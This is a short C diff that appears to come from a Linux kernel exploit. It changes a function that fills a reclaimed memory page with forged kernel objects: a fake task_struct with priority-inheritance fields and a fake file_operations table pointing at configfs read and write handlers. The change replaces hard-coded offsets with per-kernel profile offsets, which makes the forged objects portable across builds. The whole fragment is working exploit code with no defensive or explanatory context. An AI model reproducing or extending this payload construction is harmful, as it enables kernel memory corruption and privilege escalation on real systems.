@@ -223,9 +223,13 @@ static void fill_reclaim_payload(uint8_t *p, uint32_t page_base) {
     *(uint32_t *)(p + 0x400 + g_profile.task_prio_off) = 120;
     *(uint32_t *)(p + 0x400 + g_profile.task_static_prio_off) = 120;
     *(uint32_t *)(p + 0x400 + g_profile.task_normal_prio_off) = 120;
-    *(uint32_t *)(p + 0x400 + 0x594) = 0;
-    *(uint32_t *)(p + 0x400 + 0x598) = 0;
-    *(uint32_t *)(p + 0x400 + 0x59c) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_rt_priority_off) = 120;
+    *(uint32_t *)(p + 0x400 + g_profile.task_sched_class_off) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_lock_off) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_waiters_off) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_waiters_off + 4) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_top_task_off) = g_profile.pi_task;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_blocked_on_off) = 0;
 
     *(uint32_t *)(p + 0x200 + g_profile.fops_read_off) = g_profile.configfs_read_file;
     *(uint32_t *)(p + 0x200 + g_profile.fops_read_off + 4) = g_profile.configfs_write_file;
